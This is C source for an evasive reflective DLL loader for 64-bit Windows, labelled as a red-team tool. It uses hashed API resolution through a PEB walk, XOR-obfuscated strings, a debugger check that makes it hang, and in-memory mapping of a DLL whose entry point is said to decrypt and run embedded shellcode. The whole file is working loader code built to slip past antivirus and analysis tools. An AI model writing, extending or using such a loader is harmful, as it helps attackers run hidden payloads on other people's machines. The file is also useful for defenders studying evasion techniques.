/*
 * loader.c - evasive reflective DLL loader (x64, PE32+ only)
 *
 * Authorized use: red team / penetration testing of systems you own or are
 * contracted to assess. Architecture: loader.exe reads a demo DLL from disk
 * (stub.dll / stub_marker.dll, name XOR-obfuscated at rest) and reflectively
 * maps it in memory. The DLL itself carries the AES-256-CBC encrypted
 * shellcode and executes it from DllMain. This module:
 *   - has NO import table and NO CRT (compiled -nostdlib, custom entry)
 *   - resolves every API via PEB walk + djb2-hashed export lookup (GetProcAddress)
 *     and runtime-decrypted (XOR-obfuscated) names for the rest
 *   - reads the payload DLL from disk with an obfuscated file name
 *   - maps the DLL entirely in memory: headers, sections, relocations, imports,
 *     TLS callbacks, per-section memory protections, then calls the entry point
 *   - wipes staging memory after execution
 */

#include <windows.h>

#include "obf_strings.h"  /* generated: XOR-obfuscated API names + DLL file name */

/* ------------------------- types ------------------------- */

typedef void *   (WINAPI *tGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE  (WINAPI *tLoadLibraryA)(LPCSTR);
typedef LPVOID   (WINAPI *tVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *tVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL     (WINAPI *tVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef void     (WINAPI *tExitProcess)(UINT);
typedef HANDLE   (WINAPI *tCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL     (WINAPI *tGetFileSizeEx)(HANDLE, PLARGE_INTEGER);
typedef BOOL     (WINAPI *tReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL     (WINAPI *tCloseHandle)(HANDLE);
typedef BOOL     (WINAPI *tDllEntry)(HINSTANCE, DWORD, LPVOID);
typedef void     (NTAPI  *tTlsCallback)(PVOID, DWORD, PVOID);

typedef struct { USHORT Length; USHORT MaxLength; PWSTR Buffer; } u_unicode_string;

/* resolved API pointers */
static tGetProcAddress  pGetProcAddress;
static tLoadLibraryA    pLoadLibraryA;
static tVirtualAlloc    pVirtualAlloc;
static tVirtualProtect  pVirtualProtect;
static tVirtualFree     pVirtualFree;
static tExitProcess     pExitProcess;
static tCreateFileA     pCreateFileA;
static tGetFileSizeEx   pGetFileSizeEx;
static tReadFile        pReadFile;
static tCloseHandle     pCloseHandle;

/* djb2 hash of lowercase(name); computed at build time */
#define HASH_GETPROCADDRESS 0x82172f7fu

/* ------------------------- helpers ------------------------- */

static void *get_peb(void) {
    void *peb = 0;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static size_t u_strlen(const char *s) {
    const char *p = s;
    while (*p) p++;
    return (size_t)(p - s);
}

static unsigned long hash_api(const char *s) {
    unsigned long h = 5381;
    while (*s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z') c = (unsigned char)(c + 32);
        h = ((h << 5) + h) + c;
    }
    return h;
}

/* walk PEB->Ldr->InMemoryOrderModuleList looking for a module by base name */
static void *find_module_by_name(const char *name) {
    void *peb = get_peb();
    if (!peb) return NULL;
    void *ldr = *(void **)((char *)peb + 0x18);
    if (!ldr) return NULL;
    void *head = (char *)ldr + 0x20;          /* InMemoryOrderModuleList */
    void *cur = *(void **)head;               /* first entry's InMemoryOrderLinks */
    size_t nlen = u_strlen(name);
    while (cur && cur != head) {
        char *entry = (char *)cur - 0x10;     /* LDR_DATA_TABLE_ENTRY base */
        void *base = *(void **)(entry + 0x30);
        u_unicode_string *un = (u_unicode_string *)(entry + 0x58); /* BaseDllName */
        if (base && un->Buffer && un->Length == nlen * 2) {
            int match = 1;
            for (size_t i = 0; i < nlen; i++) {
                unsigned char a = (unsigned char)name[i];
                wchar_t b = un->Buffer[i];
                if (b >= L'A' && b <= L'Z') b = (wchar_t)(b + 32);
                if (a >= 'A' && a <= 'Z') a = (unsigned char)(a + 32);
                if ((wchar_t)a != b) { match = 0; break; }
            }
            if (match) return base;
        }
        cur = *(void **)cur;                  /* Flink */
    }
    return NULL;
}

/* export-walk lookup by hash; returns NULL when the export is a forwarder
 * (forwarders are resolved by GetProcAddress instead) */
static void *find_export_hash(void *base, unsigned long hash) {
    if (!base) return NULL;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)((char *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return NULL;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_sz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)((char *)base + exp_rva);
    DWORD *names  = (DWORD *)((char *)base + exp->AddressOfNames);
    WORD  *ords   = (WORD  *)((char *)base + exp->AddressOfNameOrdinals);
    DWORD *funcs  = (DWORD *)((char *)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *nm = (const char *)base + names[i];
        if (hash_api(nm) != hash) continue;
        DWORD rva = funcs[ords[i]];
        if (rva >= exp_rva && rva < exp_rva + exp_sz) return NULL; /* forwarded */
        return (char *)base + rva;
    }
    return NULL;
}

/* decrypt a compile-time obfuscated string into a stack buffer */
/* src is const volatile: gcc cannot constant-fold the per-byte XOR even
 * though the arrays and keys are compile-time constants, so the plaintext
 * never materializes in the binary */
static int xor_dec(const volatile unsigned char *src, size_t n, unsigned char key, char *dst, size_t dstsz) {
    if (n + 1 > dstsz) return -1;
    for (size_t i = 0; i < n; i++) dst[i] = (char)(src[i] ^ key);
    dst[n] = 0;
    return 0;
}

/* resolve an API by obfuscated name through GetProcAddress (handles forwards) */
static void *resolve_api(void *k32base, const volatile unsigned char *obf, size_t n, unsigned char key) {
    char name[64];
    if (xor_dec(obf, n, key, name, sizeof(name)) != 0) return NULL;
    return pGetProcAddress((HMODULE)k32base, name);
}

static int init_apis(void) {
    void *k32 = find_module_by_name("kernel32.dll");
    void *kbase = find_module_by_name("kernelbase.dll");

    pGetProcAddress = (tGetProcAddress)find_export_hash(k32, HASH_GETPROCADDRESS);
    if (!pGetProcAddress) pGetProcAddress = (tGetProcAddress)find_export_hash(kbase, HASH_GETPROCADDRESS);
    if (!pGetProcAddress) return -1;

    pLoadLibraryA   = (tLoadLibraryA)  resolve_api(k32, obf_LoadLibraryA,   OBF_LOADLIBRARYA_LEN,   OBF_LOADLIBRARYA_KEY);
    pVirtualAlloc   = (tVirtualAlloc)  resolve_api(k32, obf_VirtualAlloc,   OBF_VIRTUALALLOC_LEN,   OBF_VIRTUALALLOC_KEY);
    pVirtualProtect = (tVirtualProtect)resolve_api(k32, obf_VirtualProtect, OBF_VIRTUALPROTECT_LEN, OBF_VIRTUALPROTECT_KEY);
    pVirtualFree    = (tVirtualFree)   resolve_api(k32, obf_VirtualFree,    OBF_VIRTUALFREE_LEN,    OBF_VIRTUALFREE_KEY);
    pExitProcess    = (tExitProcess)   resolve_api(k32, obf_ExitProcess,    OBF_EXITPROCESS_LEN,    OBF_EXITPROCESS_KEY);
    pCreateFileA    = (tCreateFileA)   resolve_api(k32, obf_CreateFileA,    OBF_CREATEFILEA_LEN,    OBF_CREATEFILEA_KEY);
    pGetFileSizeEx  = (tGetFileSizeEx) resolve_api(k32, obf_GetFileSizeEx,  OBF_GETFILESIZEEX_LEN,  OBF_GETFILESIZEEX_KEY);
    pReadFile       = (tReadFile)      resolve_api(k32, obf_ReadFile,       OBF_READFILE_LEN,       OBF_READFILE_KEY);
    pCloseHandle    = (tCloseHandle)   resolve_api(k32, obf_CloseHandle,    OBF_CLOSEHANDLE_LEN,    OBF_CLOSEHANDLE_KEY);

    if (!pLoadLibraryA || !pVirtualAlloc || !pVirtualProtect || !pVirtualFree ||
        !pExitProcess || !pCreateFileA || !pGetFileSizeEx || !pReadFile || !pCloseHandle)
        return -1;
    return 0;
}

/* ------------------- reflective mapping ------------------- */

static void mem_copy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

/* volatile: guarantees the wipe is emitted and cannot be folded into a
 * libc memset call (we link -nostdlib) or optimized away entirely */
static void mem_zero(void *dst, size_t n) {
    volatile unsigned char *d = (volatile unsigned char *)dst;
    while (n--) *d++ = 0;
}

/*
 * Load a PE32+ DLL image from a raw memory buffer.
 * Maps into a fresh RW allocation, applies relocations, resolves imports,
 * runs TLS callbacks, sets per-section protections, invokes the entry point.
 */
static int reflective_load(const void *raw, size_t raw_len) {
    if (!raw || raw_len < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) return -1;

    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;
    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64 *)((const char *)raw + dos->e_lfanew);
    if ((unsigned char *)nt >= (unsigned char *)raw + raw_len - sizeof(IMAGE_NT_HEADERS64)) return -1;
    if (nt->Signature != IMAGE_NT_SIGNATURE) return -1;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return -1; /* PE32+ only */

    const IMAGE_OPTIONAL_HEADER64 *opt = &nt->OptionalHeader;
    if (opt->SizeOfImage == 0 || opt->SizeOfImage < opt->SizeOfHeaders) return -1;

    void *img = pVirtualAlloc(NULL, opt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!img) return -1;

    /* 1. headers */
    size_t hdr = opt->SizeOfHeaders;
    if (hdr > raw_len) hdr = raw_len;
    mem_copy(img, raw, hdr);

    /* 2. sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        size_t va = sec->VirtualAddress;
        size_t raw_off = sec->PointerToRawData;
        size_t raw_sz = sec->SizeOfRawData;
        if (va >= opt->SizeOfImage) continue;
        if (raw_off >= raw_len) continue;
        if (raw_off + raw_sz > raw_len) raw_sz = raw_len - raw_off;
        if (va + raw_sz > opt->SizeOfImage) raw_sz = opt->SizeOfImage - va;
        mem_copy((char *)img + va, (const char *)raw + raw_off, raw_sz);
        /* remainder (bss) is already zeroed by VirtualAlloc */
    }

    LONG_PTR delta = (LONG_PTR)img - (LONG_PTR)(ULONG_PTR)opt->ImageBase;

    /* 3. relocations */
    DWORD reloc_rva = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD reloc_sz  = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (delta != 0 && reloc_rva && reloc_sz) {
        IMAGE_BASE_RELOCATION *blk = (IMAGE_BASE_RELOCATION *)((char *)img + reloc_rva);
        size_t consumed = 0;
        while (consumed + sizeof(IMAGE_BASE_RELOCATION) <= reloc_sz &&
               blk->VirtualAddress && blk->SizeOfBlock &&
               consumed + blk->SizeOfBlock <= reloc_sz) {
            size_t count = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            WORD *ent = (WORD *)((char *)blk + sizeof(IMAGE_BASE_RELOCATION));
            for (size_t j = 0; j < count; j++) {
                WORD type = (WORD)(ent[j] >> 12);
                size_t off = ent[j] & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64)
                    *(ULONGLONG *)((char *)img + blk->VirtualAddress + off) += (ULONGLONG)delta;
                else if (type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD *)((char *)img + blk->VirtualAddress + off) += (DWORD)(ULONG_PTR)delta;
            }
            consumed += blk->SizeOfBlock;
            blk = (IMAGE_BASE_RELOCATION *)((char *)blk + blk->SizeOfBlock);
        }
    }

    /* 4. imports */
    DWORD imp_rva = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD imp_sz  = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    if (imp_rva) {
        IMAGE_IMPORT_DESCRIPTOR *desc = (IMAGE_IMPORT_DESCRIPTOR *)((char *)img + imp_rva);
        size_t d_off = 0;
        while (d_off + sizeof(IMAGE_IMPORT_DESCRIPTOR) <= (imp_sz ? imp_sz : opt->SizeOfImage) && desc->Name) {
            const char *dllname = (const char *)img + desc->Name;
            HMODULE hmod = pLoadLibraryA(dllname);
            if (!hmod) { pVirtualFree(img, 0, MEM_RELEASE); return -1; }
            IMAGE_THUNK_DATA64 *oft = (IMAGE_THUNK_DATA64 *)((char *)img + desc->OriginalFirstThunk);
            IMAGE_THUNK_DATA64 *ft  = (IMAGE_THUNK_DATA64 *)((char *)img + desc->FirstThunk);
            if (!desc->OriginalFirstThunk) oft = ft;
            for (; oft->u1.AddressOfData; oft++, ft++) {
                if (oft->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    ft->u1.Function = (ULONGLONG)(ULONG_PTR)pGetProcAddress(
                        hmod, (LPCSTR)(ULONG_PTR)(oft->u1.Ordinal & 0xFFFF));
                } else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)((char *)img + oft->u1.AddressOfData);
                    ft->u1.Function = (ULONGLONG)(ULONG_PTR)pGetProcAddress(hmod, (LPCSTR)ibn->Name);
                }
                if (!ft->u1.Function) { pVirtualFree(img, 0, MEM_RELEASE); return -1; }
            }
            d_off += sizeof(IMAGE_IMPORT_DESCRIPTOR);
            desc++;
        }
    }

    /* 5. per-section memory protections. Applied BEFORE the TLS callbacks and
     * the entry point run: the image starts as one PAGE_READWRITE allocation
     * and x64 DEP forbids executing RW code, so .text must be made executable
     * first (the OS loader does the same before invoking callbacks). */
    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        size_t sz = sec->Misc.VirtualSize;
        if (!sz) sz = sec->SizeOfRawData;
        DWORD prot = PAGE_READONLY;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            prot = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        DWORD old = 0;
        pVirtualProtect((char *)img + sec->VirtualAddress, sz, prot, &old);
    }
    { DWORD old = 0; pVirtualProtect(img, opt->SizeOfHeaders, PAGE_READONLY, &old); }

    /* 6. TLS callbacks.
     * The TLS directory's VA fields are ordinary absolute pointers: when the
     * image has a base-relocation directory they are covered by .reloc entries
     * and the reloc pass above already fixed them (exactly like the OS loader,
     * which never re-adds delta afterwards). Only when the image ships no
     * .reloc directory do we fix them up by hand (best effort).
     * The callback array (NULL-terminated) and each callback pointer are
     * validated to lie inside the mapped image so a malformed or absent TLS
     * directory can never crash the loader. */
    DWORD tls_rva = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tls_rva) {
        IMAGE_TLS_DIRECTORY64 *tls = (IMAGE_TLS_DIRECTORY64 *)((char *)img + tls_rva);
        if (delta != 0 && !(reloc_rva && reloc_sz)) {
            tls->AddressOfIndex     = (ULONGLONG)((LONG_PTR)tls->AddressOfIndex + delta);
            tls->AddressOfCallBacks = (ULONGLONG)((LONG_PTR)tls->AddressOfCallBacks + delta);
        }
        ULONGLONG cb_addr = tls->AddressOfCallBacks;
        ULONGLONG img_lo = (ULONGLONG)(ULONG_PTR)img;
        ULONGLONG img_hi = (ULONGLONG)(ULONG_PTR)img + opt->SizeOfImage; /* one-past-end */
        if (cb_addr && cb_addr >= img_lo && cb_addr <= img_hi - 8) {
            ULONGLONG *cb = (ULONGLONG *)(ULONG_PTR)cb_addr;
            while (cb_addr <= img_hi - 8 && *cb) {
                ULONGLONG fnv = *cb;
                if (fnv < img_lo || fnv >= img_hi) break; /* out-of-image callback */
                ((tTlsCallback)(ULONG_PTR)fnv)((PVOID)img, DLL_PROCESS_ATTACH, NULL);
                cb_addr += 8;
                cb++;
            }
        }
    }

    /* 7. call the entry point (DllMain / DllMainCRTStartup) */
    if (!opt->AddressOfEntryPoint) { pVirtualFree(img, 0, MEM_RELEASE); return -1; }
    tDllEntry ep = (tDllEntry)((char *)img + opt->AddressOfEntryPoint);
    BOOL ok = ep((HINSTANCE)img, DLL_PROCESS_ATTACH, NULL);
    if (!ok) { pVirtualFree(img, 0, MEM_RELEASE); return -1; }

    return 0;
}

/* ------------------------- entry ------------------------- */

void entry(void) {
    if (init_apis() != 0) return; /* cannot proceed without APIs */

    /* anti-debug: PEB.BeingDebugged + NtGlobalFlag */
    void *peb = get_peb();
    if (peb) {
        unsigned char being_debugged = *(unsigned char *)((char *)peb + 0x02);
        unsigned long nt_global_flag = *(unsigned long *)((char *)peb + 0x68);
        if (being_debugged || (nt_global_flag & 0x70)) {
            for (;;) __asm__ __volatile__("pause"); /* linger, never execute */
        }
    }

    /* de-obfuscate the payload DLL file name (stub.dll / stub_marker.dll) */
    char dll_name[32];
#ifdef MARKER
    if (xor_dec(obf_dll_filename_marker, OBF_DLL_FILENAME_MARKER_LEN,
                OBF_DLL_FILENAME_MARKER_KEY, dll_name, sizeof(dll_name)) != 0)
        return;
#else
    if (xor_dec(obf_dll_filename, OBF_DLL_FILENAME_LEN,
                OBF_DLL_FILENAME_KEY, dll_name, sizeof(dll_name)) != 0)
        return;
#endif

    /* open + size the DLL (reject anything over 16 MiB) */
    HANDLE h = pCreateFileA(dll_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { pExitProcess(1); }
    LARGE_INTEGER fsz;
    if (!pGetFileSizeEx(h, &fsz)) { pCloseHandle(h); pExitProcess(1); }
    if (fsz.QuadPart <= 0 || fsz.QuadPart > 0x1000000) {
        pCloseHandle(h); pExitProcess(1);
    }
    size_t dll_len = (size_t)fsz.QuadPart;

    /* staging buffer + full read */
    unsigned char *buf = (unsigned char *)pVirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { pCloseHandle(h); pExitProcess(1); }
    size_t off = 0;
    while (off < dll_len) {
        DWORD chunk = (DWORD)((dll_len - off) > 0x7FFFFFFF ? 0x7FFFFFFF : (dll_len - off));
        DWORD rd = 0;
        if (!pReadFile(h, buf + off, chunk, &rd, NULL) || rd == 0) break;
        off += rd;
    }
    pCloseHandle(h);
    if (off != dll_len) { pVirtualFree(buf, 0, MEM_RELEASE); pExitProcess(1); }

    /* reflective load: DllMain decrypts + runs the embedded shellcode */
    if (reflective_load(buf, dll_len) != 0) {
        pVirtualFree(buf, 0, MEM_RELEASE); pExitProcess(1);
    }

    /* wipe staging memory */
    mem_zero(buf, dll_len);
    pVirtualFree(buf, 0, MEM_RELEASE);

    pExitProcess(0);
}

/* stack-probe helper referenced by mingw for large frames; harmless if unused */
__attribute__((naked, used))
void __chkstk_ms(void) {
    __asm__ __volatile__(
        "movq %rax, %r11\n\t"
        "movq %rsp, %rax\n\t"
        "subq %rcx, %rax\n\t"
        "andq $-16, %rax\n\t"
        "1:\n\t"
        "subq $0x1000, %rsp\n\t"
        "orq $0, (%rsp)\n\t"
        "cmpq %rsp, %rax\n\t"
        "jb 1b\n\t"
        "movq %rax, %rsp\n\t"
        "movq %r11, %rax\n\t"
        "ret\n\t");
}
